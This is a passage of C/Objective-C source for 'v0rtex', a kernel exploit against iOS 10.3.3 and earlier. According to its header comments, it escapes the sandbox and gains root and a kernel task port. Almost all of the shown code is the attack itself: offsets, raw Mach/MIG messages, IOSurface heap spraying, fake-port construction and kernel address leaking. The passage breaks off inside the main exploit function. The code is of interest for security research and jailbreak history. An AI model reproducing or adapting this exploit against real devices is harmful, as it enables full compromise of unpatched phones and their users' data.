// v0rtex
// Bug by Ian Beer.
// Exploit by Siguza.

// Status quo:
// - Escapes sandbox, gets root and tfp0, should work on A7-A10 devices <=10.3.3.
// - Can call arbitrary kernel functions with up to 7 args via KCALL().
// - Relies on mach_zone_force_gc() which was removed in iOS 11, but the same
//   effect should be achievable by continuously spraying through zones and
//   measuring how long it takes - garbage collection usually takes ages. :P
// - Occasionally seems to mess with SpringBoard, i.e. apps don't open when you
//   tap on their icons - sometimes affects only v0rtex, sometimes all of them,
//   sometimes even freezes the lock screen. Can happen even if the exploit
//   aborts very early on, so I'm not sure whether it's even due to that, or due
//   to my broken UI.
// - Most common panic at this point is "pmap_tte_deallocate(): ... refcnt=0x1",
//   which can occur when the app is killed, but only if shmem_addr has been
//   faulted before. Faulting that page can _sometimes_ increase the ref count
//   on its tte entry, which causes the mentioned panic when the task is
//   destroyed and its pmap with it. Exact source of this is unknown, but I
//   suspect it happening in pmap_enter_options_internal(), depending on page
//   compression status (i.e. if the page is compressed refcnt_updated is set to
//   true and the ref count isn't increased afterwards, otherwise it is).
//   On 32-bit such a panic can be temporarily averted with mlock(), but that
//   seems to cause even greater trouble later with zalloc, and on 64-bit mlock
//   even refuses to work. Deallocating shmem_addr from our address space does
//   not fix the problem, and neither does allocating new memory at that address
//   and faulting into it (which should _guarantee_ that the corresponding pmap
//   entry is updated). Fixing up the ref count manually is very tedious and
//   still seems to cause trouble with zalloc. Calling mach_zone_force_gc()
//   after releasing the IOSurfaceRootUserClient port seems to _somewhat_ help,
//   as does calling sched_yield() before mach_vm_remap() and faulting the page
//   right after, so that's what I'm doing for now.
//   In the long term, this should really be replaced by something deterministic
//   that _always_ works (like removing the tte entirely).

// Not sure what'll really become of this, but it's certainly not done yet.
// Pretty sure I'll leave iOS 11 to Ian Beer though, for the time being.

#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror, memset
#include <unistd.h>             // usleep, setuid, getuid
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>

#import "v0rtex.h"
#import "common.h"
#import "offsets.h"


static const uint64_t OFFSET_sizeof_task                        = 0x550;
static const uint64_t OFFSET_task_itk_registered                = 0x2e8;
static const uint64_t OFFSET_task_bsd_info                      = 0x360;
static const uint64_t OFFSET_proc_ucred                         = 0x100;
static const uint64_t OFFSET_vm_map_hdr                         = 0x10;
static const uint64_t OFFSET_ipc_space_is_task                  = 0x28;
static const uint64_t OFFSET_realhost_special                   = 0x10;
static const uint64_t OFFSET_vtab_get_retain_count              = 0x3;
static const uint64_t OFFSET_vtab_get_external_trap_for_index   = 0xb7;

static const uint64_t OFFSET_TASK_ITK_SELF                      = 0xd8;
static const uint64_t OFFSET_IOUSERCLIENT_IPC                   = 0x9c;

static const uint64_t IOSURFACE_CREATE_OUTSIZE                  = 0x3c8;

#define KERNEL_MAGIC            MH_MAGIC_64
#define KERNEL_HEADER_OFFSET    0x4000
#define KERNEL_SLIDE_STEP       0x100000

#define NUM_BEFORE              0x2000
#define NUM_AFTER               0x1000
#define NUM_DATA                0x4000
#define DATA_SIZE               0x1000
#define VTAB_SIZE               200

static const uint64_t IOSURFACE_CREATE_SURFACE  = 0;
static const uint64_t IOSURFACE_SET_VALUE       = 9;
static const uint64_t IOSURFACE_GET_VALUE       = 10;
static const uint64_t IOSURFACE_DELETE_VALUE    = 11;

static const uint32_t IKOT_TASK                 = 2;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};


//------------------------------------------------------------------------------
#pragma mark - macros

#define UINT64_ALIGN(addr) (((addr) + 7) & ~7)

#define UNALIGNED_COPY(src, dst, size) \
do \
{ \
for(volatile uint32_t *_src = (volatile uint32_t*)(src), \
*_dst = (volatile uint32_t*)(dst), \
*_end = (volatile uint32_t*)((uintptr_t)(_src) + (size)); \
_src < _end; \
*(_dst++) = *(_src++) \
); \
} while(0)

#define UNALIGNED_KPTR_DEREF(addr) (((kptr_t)*(volatile uint32_t*)(addr)) | (((kptr_t)*((volatile uint32_t*)(addr) + 1)) << 32))

#define VOLATILE_ZERO(addr, size) \
do \
{ \
for(volatile uintptr_t *ptr = (volatile uintptr_t*)(addr), \
*end = (volatile uintptr_t*)((uintptr_t)(ptr) + (size)); \
ptr < end; \
*(ptr++) = 0 \
); \
} while(0)

#define RELEASE_PORT(port) \
do \
{ \
if(MACH_PORT_VALID((port))) \
{ \
_kernelrpc_mach_port_destroy_trap(self, (port)); \
port = MACH_PORT_NULL; \
} \
} while(0)


//------------------------------------------------------------------------------
#pragma mark - symbols

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);


//------------------------------------------------------------------------------
#pragma mark - helpers

static const char *errstr(int r)
{
    return r == 0 ? "success" : strerror(r);
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}


//------------------------------------------------------------------------------
#pragma mark - MIG

static kern_return_t my_mach_zone_force_gc(host_t host)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    union {
        Request In;
        Reply Out;
    } Mess;
    
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;
    
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = host;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 221;
    InP->Head.msgh_reserved = 0;
    
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    return ret;
}

static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name, mach_vm_address_t *context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    union {
        Request In;
        Reply Out;
    } Mess;
    
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;
    
    InP->NDR = NDR_record;
    InP->name = name;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3228;
    InP->Head.msgh_reserved = 0;
    
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    if(ret == KERN_SUCCESS)
    {
        *context = OutP->context;
    }
    return ret;
}

kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
        mach_vm_address_t context;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    union {
        Request In;
        Reply Out;
    } Mess;
    
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;
    
    InP->NDR = NDR_record;
    InP->name = name;
    InP->context = context;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3229;
    InP->Head.msgh_reserved = 0;
    
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    return ret;
}

// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
// Prepare everything - sched_yield() - fire.
static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } SetRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;
    
    DeleteRequest *DInP = &DMess.In;
    Reply *DOutP = &DMess.Out;
    
    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;
    
    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);
    
    DInP->ool_input = 0;
    DInP->ool_input_size = 0;
    
    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;
    
    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;
    
    // Set
    union {
        SetRequest In;
        Reply Out;
    } SMess;
    
    SetRequest *SInP = &SMess.In;
    Reply *SOutP = &SMess.Out;
    
    SInP->NDR = NDR_record;
    SInP->selector = IOSURFACE_SET_VALUE;
    SInP->scalar_inputCnt = 0;
    
    SInP->inband_inputCnt = 0;
    
    SInP->ool_input = (mach_vm_address_t)buf;
    SInP->ool_input_size = len;
    
    SInP->inband_outputCnt = sizeof(uint32_t);
    SInP->scalar_outputCnt = 0;
    SInP->ool_output = 0;
    SInP->ool_output_size = 0;
    
    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    SInP->Head.msgh_remote_port = client;
    SInP->Head.msgh_local_port = mig_get_reply_port();
    SInP->Head.msgh_id = 2865;
    SInP->Head.msgh_reserved = 0;
    
    // Deep breath
    sched_yield();
    
    // Fire
    kern_return_t ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = DOutP->RetCode;
    }
    if(ret != KERN_SUCCESS)
    {
        return ret;
    }
    ret = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = SOutP->RetCode;
    }
    return ret;
}


//------------------------------------------------------------------------------
#pragma mark - data structures

typedef struct
{
    kptr_t prev;
    kptr_t next;
    kptr_t start;
    kptr_t end;
} kmap_hdr_t;

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct {
    union {
        kptr_t port;
        uint32_t index;
    } notify;
    union {
        uint32_t name;
        kptr_t size;
    } name;
} kport_request_t;

typedef union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
} ktask_t;



//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
#pragma mark - v0rtex exploit -

kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kerncred, uint64_t *selfcred, uint64_t *selfproc) {
    kern_return_t retval = KERN_FAILURE,
    ret = 0;
    task_t self = mach_task_self();
    host_t host = mach_host_self();
    
    io_connect_t client = MACH_PORT_NULL;
    mach_port_t stuffport = MACH_PORT_NULL;
    mach_port_t realport = MACH_PORT_NULL;
    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
    mach_port_t port = MACH_PORT_NULL;
    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
    mach_port_t fakeport = MACH_PORT_NULL;
    mach_vm_address_t shmem_addr = 0;
    mach_port_array_t maps = NULL;
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    if(!MACH_PORT_VALID(service))
    {
        goto out;
    }
    
    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        goto out;
    }
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    union
    {
        char _padding[IOSURFACE_CREATE_OUTSIZE];
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface;
    memset(&surface, 0, sizeof(surface));
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &stuffport);
    LOG("stuffport: %x, %s", stuffport, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(stuffport))
    {
        goto out;
    }
    
    ret = _kernelrpc_mach_port_insert_right_trap(self, stuffport, stuffport, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
    LOG("realport: %x, %s", realport, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(realport))
    {
        goto out;
    }
    
    sched_yield();
    // Clean out full pages already in freelists
    ret = my_mach_zone_force_gc(host);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
        goto out;
    }
    
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out;
        }
    }
    
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &port);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
        goto out;
    }
    if(!MACH_PORT_VALID(port))
    {
        LOG("port: %x", port);
        goto out;
    }
    
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out;
        }
    }
    
    LOG("port: %x", port);
    
    ret = _kernelrpc_mach_port_insert_right_trap(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
#pragma pack(4)
    typedef struct {
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t desc[2];
    } StuffMsg;
#pragma pack()
    StuffMsg msg;
    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.base.header.msgh_remote_port = stuffport;
    msg.base.header.msgh_local_port = MACH_PORT_NULL;
    msg.base.header.msgh_id = 1234;
    msg.base.header.msgh_reserved = 0;
    msg.base.body.msgh_descriptor_count = 2;
    msg.desc[0].address = before;
    msg.desc[0].count = NUM_BEFORE;
    msg.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.desc[0].deallocate = FALSE;
    msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.desc[1].address = after;
    msg.desc[1].count = NUM_AFTER;
    msg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.desc[1].deallocate = FALSE;
    msg.desc[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ret = mach_msg(&msg.base.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        RELEASE_PORT(before[i]);
    }
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        RELEASE_PORT(after[i]);
    }
    
    uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
    {
        // Some header or something
        surface.data.id,
        0x0,
        
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,
        
        kOSSerializeString | (DATA_SIZE - 1),
    };
    dict[DATA_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;
    
    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
    // is actually 0x1000, so references to our reallocated memory may be shifted
    // by (0x1000 % sizeof(kport_t))
    kport_t triple_kport =
    {
        .ip_lock =
        {
            .data = 0x0,
            .type = 0x11,
        },
        .ip_messages =
        {
            .port =
            {
                .waitq =
                {
                    .waitq_queue =
                    {
                        .next = 0x0,
                        .prev = 0x11,
                    }
                },
            },
        },
        .ip_nsrequest = 0x0,
        .ip_pdrequest = 0x11,
    };
    for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        UNALIGNED_COPY(&triple_kport, ptr, sizeof(kport_t));
    }
    
    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
    // sleep after the connect call and register again, thus releasing the reference synchronously.
    ret = mach_ports_register(self, &port, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    uint64_t ref = 0;
    uint64_t in[3] = { 0, 0x666, 0 };
    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);
    
    LOG("herp derp");
    usleep(300000);
    
    sched_yield();
    ret = mach_ports_register(self, &client, 1); // gonna use that later
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    //LOG("herp derp mcgerp");
    //usleep(300000);
    
    // Prevent cleanup
    fakeport = port;
    port = MACH_PORT_NULL;
    
    // Release port with ool port refs
    RELEASE_PORT(stuffport);
    
    sched_yield();
    ret = my_mach_zone_force_gc(host);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
        goto out;
    }
    //LOG("herp derp bajerp");
    //usleep(300000);
    
    for(uint32_t i = 0; i < NUM_DATA; ++i)
    {
        dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        kport_t *dptr = (kport_t*)&dict[5];
        for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
        {
            *(((volatile uint32_t*)&dptr[j].ip_context) + 1) = 0x10000000 | i;
            *(volatile uint32_t*)&dptr[j].ip_messages.port.pad = 0x20000000 | i;
            *(volatile uint32_t*)&dptr[j].ip_lock.pad = 0x30000000 | i;
        }
        uint32_t dummy = 0;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        if(ret != KERN_SUCCESS)
        {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
            goto out;
        }
    }
    
    uint64_t ctx = 0xffffffff;
    ret = my_mach_port_get_context(self, fakeport, &ctx);
    LOG("mach_port_get_context: 0x%016llx, %s", ctx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    uint32_t shift_mask = ctx >> 60;
    if(shift_mask < 1 || shift_mask > 3)
    {
        LOG("Invalid shift mask.");
        goto out;
    }
    uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));
    
    uint32_t idx = (ctx >> 32) & 0xfffffff;
    dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
    uint32_t request[] =
    {
        // Same header
        surface.data.id,
        0x0,
        
        transpose(idx), // Key
        0x0, // Null terminator
    };
    kport_t kport =
    {
        .ip_bits = 0x80000000, // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
        .ip_references = 100,
        .ip_lock =
        {
            .type = 0x11,
        },
        .ip_messages =
        {
            .port =
            {
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_srights = 99,
    };
    
    // Note to self: must be `(uintptr_t)&dict[5] + DATA_SIZE` and not `ptr + DATA_SIZE`.
    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        UNALIGNED_COPY(&kport, ptr, sizeof(kport_t));
    }
    
    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    //LOG("herp derp fasherp");
    //usleep(300000);
    
    // Register realport on fakeport
    mach_port_t notify = MACH_PORT_NULL;
    //XXX: dies here a lot
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification(realport): %x, %s", notify, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    if(size < DATA_SIZE + 0x10)
    {
        LOG("Response too short.");
        goto out;
    }
    
    uint32_t fakeport_off = -1;
    kptr_t realport_addr = 0;
    for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        kptr_t val = UNALIGNED_KPTR_DEREF(&((kport_t*)ptr)->ip_pdrequest);
        if(val)
        {
            fakeport_off = ptr - (uintptr_t)&response[4];
            realport_addr = val;
            break;
        }
    }
    if(!realport_addr)
    {
        LOG("Failed to leak realport address");
        goto out;
    }
    LOG("realport addr: " ADDR, realport_addr);
    uintptr_t fakeport_dictbuf = (uintptr_t)&dict[5] + fakeport_off;
    
    // Register fakeport on itself (and clean ref on realport)
    notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, fakeport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification(fakeport): %x, %s", notify, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    if(size < DATA_SIZE + 0x10)
    {
        LOG("Response too short.");
        goto out;
    }
    kptr_t fakeport_addr = UNALIGNED_KPTR_DEREF(&((kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest);
    if(!fakeport_addr)
    {
        LOG("Failed to leak fakeport address");
        goto out;
    }
    LOG("fakeport addr: " ADDR, fakeport_addr);
    kptr_t fake_addr = fakeport_addr - fakeport_off;
    
    kport_request_t kreq =
    {
        .notify =
        {
            .port = 0,
        }
    };
    kport.ip_requests = fakeport_addr + ((uintptr_t)&kport.ip_context - (uintptr_t)&kport) - ((uintptr_t)&kreq.name.size - (uintptr_t)&kreq);
    UNALIGNED_COPY(&kport, fakeport_dictbuf, sizeof(kport));
    
